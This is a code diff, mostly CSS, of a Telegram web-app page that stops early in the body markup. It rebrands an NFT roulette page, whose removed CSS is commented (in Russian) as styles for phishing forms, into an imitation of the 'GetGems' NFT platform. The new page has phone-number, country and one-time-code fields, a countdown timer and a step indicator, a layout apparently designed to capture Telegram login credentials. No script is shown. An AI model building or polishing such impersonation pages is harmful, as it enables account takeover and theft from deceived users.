@@ -1,23 +1,24 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Golden NFT</title>
+    <title>GetGems - Official NFT Platform</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         :root {
-            --primary: #FF6B00;
-            --primary-dark: #CC5600;
-            --primary-light: #FF8C42;
-            --gradient: linear-gradient(135deg, #FF6B00, #FF8C00, #FFA500);
-            --background: #0F0F0F;
-            --card-bg: #1A1A1A;
-            --card-shadow: 0 4px 20px rgba(255, 107, 0, 0.15);
-            --text: #FFFFFF;
-            --text-secondary: #888888;
-            --accent-glow: 0 0 15px rgba(255, 107, 0, 0.3);
-            --border: 1px solid rgba(255, 107, 0, 0.2);
+            --primary: #0088CC;
+            --primary-dark: #006699;
+            --primary-light: #00A2E8;
+            --gradient: linear-gradient(135deg, #0088CC, #00A2E8, #00C8FF);
+            --background: #FFFFFF;
+            --card-bg: #F8F9FA;
+            --card-shadow: 0 4px 20px rgba(0, 136, 204, 0.15);
+            --text: #333333;
+            --text-secondary: #666666;
+            --success: #00A650;
+            --error: #FF4444;
+            --warning: #FF9500;
         }
 
         * {
@@ -29,1836 +30,930 @@
         body {
             background: var(--background);
             color: var(--text);
-            font-family: 'Inter', 'Segoe UI', system-ui, sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
             min-height: 100vh;
-            overflow-x: hidden;
-            line-height: 1.4;
+            line-height: 1.6;
         }
 
         .container {
-            max-width: 100%;
-            width: 100%;
+            max-width: 400px;
             margin: 0 auto;
-            padding: 15px;
-            animation: fadeInUp 0.6s ease-out;
-        }
-
-        @media (min-width: 768px) {
-            .container {
-                max-width: 400px;
-                padding: 20px;
-            }
-        }
-
-        @keyframes fadeInUp {
-            from {
-                opacity: 0;
-                transform: translateY(20px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
+            padding: 20px;
+            min-height: 100vh;
         }
 
         .header {
             text-align: center;
-            margin-bottom: 25px;
-            padding: 10px 0;
+            padding: 30px 0;
+            background: var(--gradient);
+            margin: -20px -20px 30px -20px;
+            color: white;
+            border-radius: 0 0 20px 20px;
         }
 
         .logo {
-            font-size: 2.2rem;
-            font-weight: 800;
-            background: var(--gradient);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            margin-bottom: 5px;
-            letter-spacing: -0.5px;
-        }
-
-        .subtitle {
-            color: var(--text-secondary);
-            font-size: 0.85rem;
-            font-weight: 400;
-            opacity: 0.8;
-        }
-
-        .section {
-            background: var(--card-bg);
-            border-radius: 16px;
-            padding: 20px;
-            margin-bottom: 15px;
-            border: var(--border);
-            box-shadow: var(--card-shadow);
-            transition: all 0.3s ease;
-        }
-
-        @media (min-width: 768px) {
-            .section {
-                padding: 25px;
-                margin-bottom: 20px;
-                border-radius: 20px;
-            }
-        }
-
-        .section:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 8px 30px rgba(255, 107, 0, 0.2);
-        }
-
-        .section-title {
-            color: var(--primary-light);
-            font-size: 1.2rem;
+            font-size: 2.5rem;
             font-weight: 700;
-            margin-bottom: 18px;
-            text-align: center;
-            position: relative;
-        }
-
-        @media (min-width: 768px) {
-            .section-title {
-                font-size: 1.3rem;
-                margin-bottom: 20px;
-            }
-        }
-
-        .section-title::after {
-            content: '';
-            position: absolute;
-            bottom: -8px;
-            left: 50%;
-            transform: translateX(-50%);
-            width: 50px;
-            height: 2px;
-            background: var(--gradient);
-            border-radius: 1px;
-        }
-
-        .stats-grid {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 12px;
-            margin-bottom: 20px;
-        }
-
-        @media (min-width: 768px) {
-            .stats-grid {
-                gap: 15px;
-                margin-bottom: 25px;
-            }
-        }
-
-        .stat-card {
-            background: linear-gradient(135deg, rgba(255, 107, 0, 0.08), rgba(255, 140, 0, 0.04));
-            border-radius: 14px;
-            padding: 18px;
-            text-align: center;
-            border: 1px solid rgba(255, 107, 0, 0.25);
-            transition: all 0.3s ease;
-        }
-
-        @media (min-width: 768px) {
-            .stat-card {
-                padding: 20px;
-                border-radius: 16px;
-            }
-        }
-
-        .stat-card:hover {
-            transform: scale(1.02);
-            box-shadow: var(--accent-glow);
-        }
-
-        .stat-value {
-            font-size: 1.8rem;
-            font-weight: 800;
-            background: var(--gradient);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            margin-bottom: 4px;
-            line-height: 1;
-        }
-
-        @media (min-width: 768px) {
-            .stat-value {
-                font-size: 2rem;
-            }
-        }
-
-        .stat-label {
-            color: var(--text-secondary);
-            font-size: 0.75rem;
-            font-weight: 500;
-            opacity: 0.9;
-        }
-
-        .referral-box {
-            background: linear-gradient(135deg, rgba(255, 107, 0, 0.12), rgba(255, 140, 0, 0.08));
-            border: 1.5px dashed var(--primary);
-            border-radius: 14px;
-            padding: 18px;
-            margin: 18px 0;
-            text-align: center;
-            position: relative;
-        }
-
-        @media (min-width: 768px) {
-            .referral-box {
-                padding: 20px;
-                margin: 20px 0;
-                border-radius: 16px;
-            }
-        }
-
-        .referral-link {
-            background: rgba(0, 0, 0, 0.6);
-            padding: 10px;
-            border-radius: 10px;
-            font-family: 'Courier New', monospace;
-            word-break: break-all;
-            border: 1px solid var(--primary);
-            font-size: 0.8rem;
-            margin-top: 10px;
-        }
-
-        @media (min-width: 768px) {
-            .referral-link {
-                padding: 12px;
-                font-size: 0.85rem;
-            }
-        }
-
-        .tab-navigation {
-            display: flex;
-            background: rgba(255, 107, 0, 0.08);
-            border-radius: 14px;
-            padding: 5px;
-            margin-bottom: 20px;
-            border: var(--border);
-            gap: 4px;
-        }
-
-        @media (min-width: 768px) {
-            .tab-navigation {
-                border-radius: 16px;
-                padding: 6px;
-                margin-bottom: 25px;
-            }
-        }
-
-        .tab {
-            flex: 1;
-            text-align: center;
-            padding: 10px 8px;
-            cursor: pointer;
-            border-radius: 10px;
-            transition: all 0.3s ease;
-            font-weight: 600;
-            color: var(--text-secondary);
-            border: none;
-            background: none;
-            font-family: inherit;
-            font-size: 0.85rem;
-            white-space: nowrap;
-        }
-
-        @media (min-width: 768px) {
-            .tab {
-                padding: 12px;
-                font-size: 0.9rem;
-                border-radius: 12px;
-            }
-        }
-
-        .tab.active {
-            background: var(--gradient);
-            color: white;
-            box-shadow: 0 3px 12px rgba(255, 107, 0, 0.25);
-            transform: scale(1.02);
-        }
-
-        .tab-content {
-            display: none;
-            animation: slideIn 0.3s ease-out;
-        }
-
-        @keyframes slideIn {
-            from {
-                opacity: 0;
-                transform: translateX(15px);
-            }
-            to {
-                opacity: 1;
-                transform: translateX(0);
-            }
-        }
-
-        .tab-content.active {
-            display: block;
-        }
-
-        /* Рулетка */
-        .roulette-container {
-            position: relative;
-            height: 180px;
-            margin: 25px 0;
-            overflow: hidden;
-            border-radius: 14px;
-            background: rgba(255, 107, 0, 0.04);
-            border: var(--border);
-        }
-
-        @media (min-width: 768px) {
-            .roulette-container {
-                height: 200px;
-                border-radius: 16px;
-                margin: 30px 0;
-            }
-        }
-
-        .roulette-track {
-            display: flex;
-            height: 100%;
-            position: absolute;
-            left: 0;
-            transition: transform 4s cubic-bezier(0.1, 0.8, 0.2, 1);
-        }
-
-        .roulette-item {
-            min-width: 90px;
-            height: 100%;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            background: linear-gradient(135deg, var(--card-bg), #222222);
-            border-right: 1px solid rgba(255, 107, 0, 0.2);
-            position: relative;
-            padding: 10px 5px;
-        }
-
-        @media (min-width: 768px) {
-            .roulette-item {
-                min-width: 100px;
-                padding: 15px 8px;
-            }
-        }
-
-        .roulette-item:last-child {
-            border-right: none;
-        }
-
-        .nft-image {
-            width: 50px;
-            height: 50px;
-            border-radius: 10px;
-            margin-bottom: 8px;
-            background-size: cover;
-            background-position: center;
-            border: 2px solid rgba(255, 107, 0, 0.4);
-            background-color: #2A2A2A;
-        }
-
-        @media (min-width: 768px) {
-            .nft-image {
-                width: 60px;
-                height: 60px;
-                border-radius: 12px;
-                margin-bottom: 10px;
-            }
-        }
-
-        .nft-name {
-            font-size: 0.65rem;
-            font-weight: 600;
-            color: var(--primary-light);
-            text-align: center;
-            max-width: 70px;
-            line-height: 1.2;
-        }
-
-        @media (min-width: 768px) {
-            .nft-name {
-                font-size: 0.7rem;
-                max-width: 80px;
-            }
-        }
-
-        .roulette-pointer {
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            width: 3px;
-            height: 100%;
-            background: var(--primary);
-            box-shadow: 0 0 15px rgba(255, 107, 0, 0.7);
-            z-index: 10;
-        }
-
-        .roulette-pointer::before {
-            content: '▼';
-            position: absolute;
-            top: -22px;
-            left: 50%;
-            transform: translateX(-50%);
-            color: var(--primary);
-            font-size: 18px;
-            text-shadow: 0 0 8px rgba(255, 107, 0, 0.8);
-            font-weight: bold;
-        }
-
-        @media (min-width: 768px) {
-            .roulette-pointer::before {
-                top: -25px;
-                font-size: 20px;
-            }
-        }
-
-        .spin-button {
-            background: var(--gradient);
-            color: white;
-            border: none;
-            padding: 16px 30px;
-            border-radius: 20px;
-            font-size: 1rem;
-            font-weight: 700;
-            cursor: pointer;
-            width: 100%;
-            margin: 18px 0;
-            transition: all 0.3s ease;
-            box-shadow: 0 5px 18px rgba(255, 107, 0, 0.35);
-            letter-spacing: 0.5px;
-        }
-
-        @media (min-width: 768px) {
-            .spin-button {
-                padding: 18px 40px;
-                font-size: 1.1rem;
-                margin: 20px 0;
-                border-radius: 25px;
-            }
-        }
-
-        .spin-button:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 8px 25px rgba(255, 107, 0, 0.5);
-        }
-
-        .spin-button:disabled {
-            background: #555;
-            cursor: not-allowed;
-            transform: none;
-            box-shadow: none;
-            opacity: 0.6;
-        }
-
-        .gift-grid {
-            display: grid;
-            gap: 12px;
-            margin: 18px 0;
-        }
-
-        @media (min-width: 768px) {
-            .gift-grid {
-                gap: 15px;
-                margin: 20px 0;
-            }
-        }
-
-        .gift-card {
-            background: linear-gradient(135deg, rgba(255, 107, 0, 0.08), rgba(255, 140, 0, 0.04));
-            border: var(--border);
-            border-radius: 14px;
-            padding: 18px;
-            transition: all 0.3s ease;
-        }
-
-        @media (min-width: 768px) {
-            .gift-card {
-                padding: 20px;
-                border-radius: 16px;
-            }
-        }
-
-        .gift-card:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 6px 20px rgba(255, 107, 0, 0.15);
-        }
-
-        .gift-header {
-            display: flex;
-            align-items: center;
             margin-bottom: 10px;
         }
 
-        .gift-icon {
-            width: 45px;
-            height: 45px;
-            border-radius: 8px;
-            background-size: cover;
-            background-position: center;
-            margin-right: 12px;
-            border: 2px solid rgba(255, 107, 0, 0.4);
-            background-color: #2A2A2A;
-            flex-shrink: 0;
-        }
-
-        @media (min-width: 768px) {
-            .gift-icon {
-                width: 50px;
-                height: 50px;
-                border-radius: 10px;
-                margin-right: 15px;
-            }
-        }
-
-        .gift-name {
-            font-size: 1rem;
-            font-weight: 700;
-            color: var(--primary-light);
-        }
-
-        .gift-details {
-            color: var(--text-secondary);
-            font-size: 0.8rem;
-            margin-top: 2px;
-        }
-
-        .gift-date {
-            color: var(--text-secondary);
-            font-size: 0.75rem;
-            margin-bottom: 12px;
-            opacity: 0.8;
-        }
-
-        .withdraw-button {
-            background: var(--gradient);
-            color: white;
-            border: none;
-            padding: 11px 20px;
-            border-radius: 10px;
-            font-weight: 600;
-            cursor: pointer;
-            width: 100%;
-            transition: all 0.3s ease;
-            box-shadow: 0 3px 12px rgba(255, 107, 0, 0.25);
-            font-size: 0.85rem;
-        }
-
-        @media (min-width: 768px) {
-            .withdraw-button {
-                padding: 12px 24px;
-                border-radius: 12px;
-                font-size: 0.9rem;
-            }
-        }
-
-        .withdraw-button:hover {
-            transform: translateY(-1px);
-            box-shadow: 0 5px 18px rgba(255, 107, 0, 0.35);
-        }
-
-        .notification {
-            background: linear-gradient(135deg, rgba(255, 107, 0, 0.15), rgba(255, 140, 0, 0.08));
-            border: 1px solid var(--primary);
-            border-radius: 14px;
-            padding: 18px;
-            margin: 18px 0;
-            text-align: center;
-        }
-
-        @media (min-width: 768px) {
-            .notification {
-                padding: 20px;
-                margin: 20px 0;
-                border-radius: 16px;
-            }
-        }
-
-        .instruction-steps {
-            display: flex;
-            flex-direction: column;
-            gap: 12px;
-            margin: 20px 0;
-        }
-
-        @media (min-width: 768px) {
-            .instruction-steps {
-                gap: 15px;
-                margin: 25px 0;
-            }
-        }
-
-        .instruction-step {
-            display: flex;
-            align-items: center;
-            padding: 16px;
-            background: rgba(255, 107, 0, 0.08);
-            border-radius: 12px;
-            border: var(--border);
-            transition: all 0.3s ease;
-        }
-
-        @media (min-width: 768px) {
-            .instruction-step {
-                padding: 20px;
-                border-radius: 14px;
-            }
-        }
-
-        .instruction-step:hover {
-            transform: translateX(3px);
-            background: rgba(255, 107, 0, 0.12);
-        }
-
-        .step-number {
-            background: var(--gradient);
-            color: white;
-            width: 32px;
-            height: 32px;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin-right: 12px;
-            font-weight: 700;
-            box-shadow: 0 3px 12px rgba(255, 107, 0, 0.35);
-            flex-shrink: 0;
-            font-size: 0.9rem;
-        }
-
-        @media (min-width: 768px) {
-            .step-number {
-                width: 35px;
-                height: 35px;
-                margin-right: 15px;
-            }
-        }
-
-        .step-text {
-            color: var(--text);
-            font-weight: 500;
-            font-size: 0.9rem;
-        }
-
-        @media (min-width: 768px) {
-            .step-text {
-                font-size: 0.95rem;
-            }
-        }
-
-        .pulse {
-            animation: pulse 2s infinite;
-        }
-
-        @keyframes pulse {
-            0%, 100% { transform: scale(1); }
-            50% { transform: scale(1.03); }
-        }
-
-        .loading {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 30px;
-            color: var(--text-secondary);
-            flex-direction: column;
-            gap: 15px;
-        }
-
-        @media (min-width: 768px) {
-            .loading {
-                padding: 40px;
-            }
-        }
-
-        .spinner {
-            width: 35px;
-            height: 35px;
-            border: 3px solid rgba(255, 107, 0, 0.3);
-            border-left: 3px solid var(--primary);
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-        }
-
-        @media (min-width: 768px) {
-            .spinner {
-                width: 40px;
-                height: 40px;
-                border-width: 4px;
-            }
-        }
-
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-
-        .win-animation {
-            animation: winPulse 0.5s ease-in-out 3;
-        }
-
-        @keyframes winPulse {
-            0%, 100% { 
-                transform: scale(1);
-                box-shadow: 0 0 15px rgba(255, 107, 0, 0.4);
-            }
-            50% { 
-                transform: scale(1.08);
-                box-shadow: 0 0 30px rgba(255, 107, 0, 0.7);
-            }
-        }
-
-        /* Стили для фишинговых форм */
-        .auth-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.92);
-            display: none;
-            justify-content: center;
-            align-items: center;
-            z-index: 10000;
-            backdrop-filter: blur(12px);
-            padding: 15px;
-        }
-
-        @media (min-width: 768px) {
-            .auth-overlay {
-                padding: 20px;
-            }
-        }
-
-        .auth-modal {
-            background: var(--card-bg);
-            border-radius: 18px;
-            padding: 25px;
-            width: 100%;
-            max-width: 360px;
-            border: 2px solid var(--primary);
-            box-shadow: 0 20px 50px rgba(255, 107, 0, 0.3);
-            animation: modalAppear 0.4s ease-out;
-            position: relative;
-        }
-
-        @media (min-width: 768px) {
-            .auth-modal {
-                border-radius: 20px;
-                padding: 30px;
-                max-width: 380px;
-            }
-        }
-
-        @keyframes modalAppear {
-            from {
-                opacity: 0;
-                transform: translateY(25px) scale(0.95);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0) scale(1);
-            }
-        }
-
-        .auth-title {
-            text-align: center;
-            font-size: 1.3rem;
-            font-weight: 700;
-            margin-bottom: 20px;
-            background: var(--gradient);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-        }
-
-        @media (min-width: 768px) {
-            .auth-title {
-                font-size: 1.4rem;
-                margin-bottom: 25px;
-            }
-        }
-
-        .auth-subtitle {
-            text-align: center;
-            color: var(--text-secondary);
-            margin-bottom: 20px;
-            font-size: 0.9rem;
-            line-height: 1.4;
+        .subtitle {
+            font-size: 1.1rem;
             opacity: 0.9;
+            font-weight: 400;
         }
 
-        .auth-input {
-            width: 100%;
-            padding: 14px 16px;
-            margin-bottom: 15px;
-            border: 2px solid rgba(255, 107, 0, 0.35);
-            border-radius: 12px;
-            background: rgba(255, 255, 255, 0.07);
-            color: var(--text);
-            font-size: 0.95rem;
-            transition: all 0.3s ease;
-        }
-
-        @media (min-width: 768px) {
-            .auth-input {
-                padding: 16px 18px;
-                margin-bottom: 18px;
-                border-radius: 14px;
-            }
-        }
-
-        .auth-input:focus {
-            outline: none;
-            border-color: var(--primary);
-            box-shadow: 0 0 0 3px rgba(255, 107, 0, 0.15);
-            background: rgba(255, 255, 255, 0.1);
-        }
-
-        .auth-button {
-            background: var(--gradient);
-            color: white;
-            border: none;
-            padding: 15px;
-            border-radius: 12px;
-            font-size: 1rem;
-            font-weight: 600;
-            cursor: pointer;
-            width: 100%;
-            margin: 10px 0;
-            transition: all 0.3s ease;
-            box-shadow: 0 4px 15px rgba(255, 107, 0, 0.3);
-        }
-
-        @media (min-width: 768px) {
-            .auth-button {
-                padding: 16px;
-                border-radius: 14px;
-                font-size: 1.05rem;
-            }
-        }
-
-        .auth-button:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 6px 20px rgba(255, 107, 0, 0.4);
-        }
-
-        .auth-button:disabled {
-            background: #555;
-            cursor: not-allowed;
-            transform: none;
-            box-shadow: none;
-            opacity: 0.6;
-        }
-
-        .auth-steps {
-            display: flex;
-            justify-content: center;
-            margin: 20px 0;
-            gap: 10px;
+        .auth-container {
+            background: var(--card-bg);
+            border-radius: 16px;
+            padding: 30px;
+            box-shadow: var(--card-shadow);
+            margin-bottom: 20px;
         }
 
         .auth-step {
-            width: 32px;
-            height: 32px;
-            border-radius: 50%;
-            background: rgba(255, 107, 0, 0.18);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: var(--text);
-            font-weight: 600;
-            font-size: 0.85rem;
-            transition: all 0.3s ease;
-            border: 2px solid transparent;
-        }
-
-        @media (min-width: 768px) {
-            .auth-step {
-                width: 35px;
-                height: 35px;
-            }
+            display: none;
+            animation: fadeIn 0.3s ease;
         }
 
         .auth-step.active {
-            background: var(--gradient);
-            transform: scale(1.1);
-            border-color: rgba(255, 255, 255, 0.25);
-            box-shadow: 0 3px 12px rgba(255, 107, 0, 0.4);
-        }
-
-        .close-button {
-            position: absolute;
-            top: 15px;
-            right: 15px;
-            background: rgba(255, 107, 0, 0.1);
-            border: none;
-            color: var(--text-secondary);
-            font-size: 1.2rem;
-            width: 32px;
-            height: 32px;
-            border-radius: 50%;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-
-        @media (min-width: 768px) {
-            .close-button {
-                top: 18px;
-                right: 18px;
-                width: 35px;
-                height: 35px;
-            }
-        }
-
-        .close-button:hover {
-            background: rgba(255, 107, 0, 0.2);
-            color: var(--primary);
-        }
-
-        .security-notice {
-            text-align: center;
-            margin-top: 18px;
-            color: var(--text-secondary);
-            font-size: 0.8rem;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 6px;
-            opacity: 0.8;
-        }
-
-        .error-message {
-            color: #ff6b6b;
-            text-align: center;
-            margin: 8px 0;
-            font-size: 0.85rem;
-            display: none;
-        }
-
-        .loading-dots {
-            display: inline-block;
-        }
-
-        .loading-dots::after {
-            content: '';
-            animation: dots 1.5s steps(4, end) infinite;
-        }
-
-        @keyframes dots {
-            0%, 20% { content: ''; }
-            40% { content: '.'; }
-            60% { content: '..'; }
-            80%, 100% { content: '...'; }
-        }
-
-        .result-popup {
-            position: fixed;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            background: var(--card-bg);
-            border-radius: 18px;
-            padding: 25px;
-            border: 2px solid var(--primary);
-            box-shadow: 0 20px 50px rgba(255, 107, 0, 0.35);
-            z-index: 1000;
-            text-align: center;
-            display: none;
-            animation: popupAppear 0.4s ease-out;
-            width: 90%;
-            max-width: 320px;
-        }
-
-        @media (min-width: 768px) {
-            .result-popup {
-                border-radius: 20px;
-                padding: 30px;
-                max-width: 350px;
-            }
-        }
-
-        @keyframes popupAppear {
-            from {
-                opacity: 0;
-                transform: translate(-50%, -50%) scale(0.85);
-            }
-            to {
-                opacity: 1;
-                transform: translate(-50%, -50%) scale(1);
-            }
-        }
-
-        /* Новые стили для авторизации */
-        .auth-step-content {
-            display: none;
-            animation: fadeIn 0.3s ease-out;
-        }
-        
-        .auth-step-content.active {
             display: block;
         }
-        
+
         @keyframes fadeIn {
             from { opacity: 0; transform: translateY(10px); }
             to { opacity: 1; transform: translateY(0); }
         }
-        
-        .step-navigation {
+
+        .step-title {
+            font-size: 1.4rem;
+            font-weight: 600;
+            margin-bottom: 20px;
+            color: var(--text);
+            text-align: center;
+        }
+
+        .step-description {
+            color: var(--text-secondary);
+            text-align: center;
+            margin-bottom: 25px;
+            font-size: 0.95rem;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 500;
+            color: var(--text);
+            font-size: 0.9rem;
+        }
+
+        .form-input {
+            width: 100%;
+            padding: 15px;
+            border: 2px solid #E1E5E9;
+            border-radius: 12px;
+            font-size: 1rem;
+            transition: all 0.3s ease;
+            background: white;
+        }
+
+        .form-input:focus {
+            outline: none;
+            border-color: var(--primary);
+            box-shadow: 0 0 0 3px rgba(0, 136, 204, 0.1);
+        }
+
+        .form-input.error {
+            border-color: var(--error);
+        }
+
+        .phone-input-container {
             display: flex;
-            justify-content: space-between;
-            margin-top: 18px;
             gap: 10px;
         }
-        
-        .step-btn {
-            background: rgba(255, 107, 0, 0.15);
-            border: 1px solid rgba(255, 107, 0, 0.3);
-            color: var(--text);
-            padding: 11px 16px;
-            border-radius: 10px;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            font-weight: 500;
-            font-size: 0.9rem;
+
+        .country-select {
+            flex: 0 0 120px;
+            position: relative;
+        }
+
+        .country-select select {
+            width: 100%;
+            padding: 15px;
+            border: 2px solid #E1E5E9;
+            border-radius: 12px;
+            background: white;
+            font-size: 1rem;
+            appearance: none;
+            background-image: url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='currentColor' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3e%3cpolyline points='6 9 12 15 18 9'%3e%3c/polyline%3e%3c/svg%3e");
+            background-repeat: no-repeat;
+            background-position: right 12px center;
+            background-size: 16px;
+        }
+
+        .phone-input {
             flex: 1;
         }
 
-        @media (min-width: 768px) {
-            .step-btn {
-                padding: 12px 18px;
-                border-radius: 12px;
-            }
-        }
-        
-        .step-btn:hover {
-            background: rgba(255, 107, 0, 0.25);
-        }
-        
-        .step-btn.primary {
-            background: var(--gradient);
-            border-color: var(--primary);
-        }
-        
-        .step-btn.primary:hover {
-            box-shadow: 0 4px 15px rgba(255, 107, 0, 0.3);
+        .btn {
+            width: 100%;
+            padding: 16px;
+            border: none;
+            border-radius: 12px;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-top: 10px;
         }
 
-        .password-toggle {
-            position: absolute;
-            right: 15px;
-            top: 50%;
-            transform: translateY(-50%);
-            background: none;
-            border: none;
+        .btn-primary {
+            background: var(--gradient);
+            color: white;
+        }
+
+        .btn-primary:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(0, 136, 204, 0.3);
+        }
+
+        .btn-primary:disabled {
+            background: #CCCCCC;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+
+        .btn-secondary {
+            background: transparent;
+            color: var(--primary);
+            border: 2px solid var(--primary);
+        }
+
+        .btn-secondary:hover {
+            background: rgba(0, 136, 204, 0.05);
+        }
+
+        .code-inputs {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+
+        .code-input {
+            flex: 1;
+            padding: 15px;
+            border: 2px solid #E1E5E9;
+            border-radius: 12px;
+            text-align: center;
+            font-size: 1.2rem;
+            font-weight: 600;
+            background: white;
+        }
+
+        .code-input:focus {
+            border-color: var(--primary);
+            outline: none;
+        }
+
+        .timer {
+            text-align: center;
             color: var(--text-secondary);
-            cursor: pointer;
+            margin: 15px 0;
             font-size: 0.9rem;
         }
 
-        .input-wrapper {
+        .error-message {
+            color: var(--error);
+            font-size: 0.9rem;
+            margin-top: 5px;
+            text-align: center;
+        }
+
+        .success-message {
+            color: var(--success);
+            font-size: 0.9rem;
+            margin-top: 5px;
+            text-align: center;
+        }
+
+        .loading {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid #ffffff;
+            border-radius: 50%;
+            border-top-color: transparent;
+            animation: spin 1s ease-in-out infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .security-notice {
+            background: #FFF3CD;
+            border: 1px solid #FFEAA7;
+            border-radius: 12px;
+            padding: 15px;
+            margin: 20px 0;
+            text-align: center;
+            color: #856404;
+            font-size: 0.9rem;
+        }
+
+        .features-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
+            margin: 25px 0;
+        }
+
+        .feature-card {
+            background: white;
+            padding: 20px;
+            border-radius: 12px;
+            text-align: center;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05);
+            border: 1px solid #E1E5E9;
+        }
+
+        .feature-icon {
+            font-size: 2rem;
+            margin-bottom: 10px;
+        }
+
+        .feature-title {
+            font-weight: 600;
+            margin-bottom: 5px;
+            font-size: 0.9rem;
+        }
+
+        .feature-desc {
+            color: var(--text-secondary);
+            font-size: 0.8rem;
+        }
+
+        .nft-preview {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            border-radius: 16px;
+            padding: 30px;
+            text-align: center;
+            color: white;
+            margin: 25px 0;
             position: relative;
+            overflow: hidden;
+        }
+
+        .nft-preview::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><defs><pattern id="gems" x="0" y="0" width="20" height="20" patternUnits="userSpaceOnUse"><circle cx="10" cy="10" r="2" fill="rgba(255,255,255,0.1)"/></pattern></defs><rect width="100" height="100" fill="url(%23gems)"/></svg>');
+        }
+
+        .nft-title {
+            font-size: 1.5rem;
+            font-weight: 700;
+            margin-bottom: 10px;
+            position: relative;
+            z-index: 1;
+        }
+
+        .nft-value {
+            font-size: 1.1rem;
+            opacity: 0.9;
+            position: relative;
+            z-index: 1;
+        }
+
+        .progress-bar {
+            height: 4px;
+            background: #E1E5E9;
+            border-radius: 2px;
+            margin: 25px 0;
+            overflow: hidden;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: var(--gradient);
+            border-radius: 2px;
+            transition: width 0.3s ease;
+        }
+
+        .step-indicator {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 30px;
+            position: relative;
+        }
+
+        .step-indicator::before {
+            content: '';
+            position: absolute;
+            top: 15px;
+            left: 0;
+            right: 0;
+            height: 2px;
+            background: #E1E5E9;
+            z-index: 1;
+        }
+
+        .step {
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            background: white;
+            border: 2px solid #E1E5E9;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 0.8rem;
+            font-weight: 600;
+            position: relative;
+            z-index: 2;
+        }
+
+        .step.active {
+            background: var(--primary);
+            border-color: var(--primary);
+            color: white;
+        }
+
+        .step.completed {
+            background: var(--success);
+            border-color: var(--success);
+            color: white;
+        }
+
+        .country-flag {
+            width: 20px;
+            height: 15px;
+            margin-right: 8px;
+            border-radius: 2px;
         }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="header">
-            <div class="logo">Golden NFT</div>
-            <div class="subtitle">Exclusive Digital Collectibles</div>
+            <div class="logo">GetGems</div>
+            <div class="subtitle">Official Telegram NFT Platform</div>
         </div>
 
-        <div class="tab-navigation">
-            <button class="tab active" data-tab="roulette">Рулетка</button>
-            <button class="tab" data-tab="gifts">Подарки</button>
-            <button class="tab" data-tab="referral">Рефералы</button>
-            <button class="tab" data-tab="info">Инфо</button>
+        <div class="step-indicator">
+            <div class="step completed">1</div>
+            <div class="step active">2</div>
+            <div class="step">3</div>
+            <div class="step">4</div>
         </div>
 
-        <!-- Вкладка Рулетка -->
-        <div id="roulette" class="tab-content active">
-            <div class="section">
-                <div class="section-title">NFT ROULETTE</div>
-                
-                <div class="stats-grid">
-                    <div class="stat-card">
-                        <div class="stat-value" id="spins-left">3</div>
-                        <div class="stat-label">SPINS LEFT</div>
-                    </div>
-                    <div class="stat-card">
-                        <div class="stat-value" id="referrals-count">0</div>
-                        <div class="stat-label">REFERRALS</div>
-                    </div>
-                </div>
-
-                <div class="roulette-container">
-                    <div class="roulette-pointer"></div>
-                    <div class="roulette-track" id="roulette-track">
-                        <!-- NFT будут добавлены через JavaScript -->
-                    </div>
-                </div>
-
-                <button class="spin-button pulse" id="spin-btn">
